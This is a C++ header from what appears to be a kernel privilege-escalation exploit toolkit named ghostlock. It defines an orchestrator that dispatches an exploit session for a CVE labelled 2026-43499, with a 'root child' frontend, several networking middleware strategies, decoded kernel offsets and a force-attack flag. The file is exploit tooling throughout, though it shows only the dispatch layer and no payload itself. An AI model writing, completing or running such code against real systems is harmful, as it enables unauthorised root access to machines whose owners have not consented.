#ifndef GHOSTLOCK_ORCHESTRATOR_HPP
#define GHOSTLOCK_ORCHESTRATOR_HPP

#include "route/component_catalog.hpp"
#include "route/pipeline.hpp"
#include "route/route_policy.hpp"
#include "session/backend/cve_2026_43499_backend.hpp"
#include "session/exploit_session.hpp"
#include "session/root_child_frontend.hpp"

namespace ghostlock::runtime {
    /* NativeOrchestrator (Batch 3/4): validate the component selection outside
     * the sensitive window and dispatch the catalogued combination through a
     * nested switch of direct template calls (no indirect dispatch). The nested
     * switch enumerates exactly the tuples combination_supported() admits;
     * anything else is RunCode::Rejected. */
    [[nodiscard]] inline RunResult run_orchestrated_pipeline(
        session::ExploitSession &exploit_session, const ComponentSelection &selection,
        const profile::kernel_offsets &decoded, const char *debug_dir, bool force_attack) {
        if (!combination_supported(selection)) return RunResult{.code = RunCode::Rejected};
        switch (selection.frontend) {
            case FrontendKind::RootChild:
                switch (selection.backend) {
                    case BackendKind::Cve2026_43499:
                        switch (selection.middleware) {
                            case MiddlewareKind::SelectStack:
                                return run_pipeline<session::frontend::RootChildPolicy,
                                                    session::backend::Cve2026_43499Policy,
                                                    route::SelectPolicy>(
                                    exploit_session, decoded, debug_dir, force_attack);
                            case MiddlewareKind::TcpZerocopy:
                                return run_pipeline<session::frontend::RootChildPolicy,
                                                    session::backend::Cve2026_43499Policy,
                                                    route::TcpPolicy>(
                                    exploit_session, decoded, debug_dir, force_attack);
                            case MiddlewareKind::MulticastWaiter:
                                return run_pipeline<session::frontend::RootChildPolicy,
                                                    session::backend::Cve2026_43499Policy,
                                                    route::MulticastPolicy>(
                                    exploit_session, decoded, debug_dir, force_attack);
                            default:
                                return RunResult{.code = RunCode::Rejected};
                        }
                    default:
                        return RunResult{.code = RunCode::Rejected};
                }
            default:
                return RunResult{.code = RunCode::Rejected};
        }
    }
} // namespace ghostlock::runtime

#endif
